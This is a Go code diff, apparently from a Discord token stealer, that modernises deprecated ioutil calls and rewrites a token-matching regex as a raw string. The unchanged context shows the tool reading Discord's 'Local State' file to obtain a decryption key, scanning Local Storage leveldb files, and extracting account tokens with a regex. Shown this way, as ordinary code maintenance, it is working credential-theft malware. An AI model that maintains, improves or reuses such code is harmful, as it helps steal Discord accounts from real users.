@@ -8,7 +8,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"net/http"
 	"os"
 	"os/user"
@@ -119,7 +118,7 @@ func getMasterKey() ([]byte, error) {
 
 	jsonFile := os.Getenv("APPDATA") + "/discord/Local State"
 
-	byteValue, err := ioutil.ReadFile(jsonFile)
+	byteValue, err := os.ReadFile(jsonFile)
 	if err != nil {
 		return nil, fmt.Errorf("could not read json file")
 	}
@@ -200,7 +199,7 @@ func searchEncryptedToken(line []byte, tokenList *[]string) {
 
 func searchDecryptedToken(line []byte, tokenList *[]string) {
 
-	var tokenRegex = regexp.MustCompile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}")
+	var tokenRegex = regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}`)
 
 	for _, match := range tokenRegex.FindAll(line, -1) {
 
@@ -337,7 +336,7 @@ func getAllTokens() {
 		}
 
 		path += "/Local Storage/leveldb/"
-		files, _ := ioutil.ReadDir(path)
+		files, _ := os.ReadDir(path)
 
 		for _, file := range files {
 			name := file.Name()
@@ -346,7 +345,7 @@ func getAllTokens() {
 				continue
 			}
 
-			content, _ := ioutil.ReadFile(path + "/" + name)
+			content, _ := os.ReadFile(path + "/" + name)
 			lines := bytes.Split(content, []byte("\\n"))
 
 			for _, line := range lines {
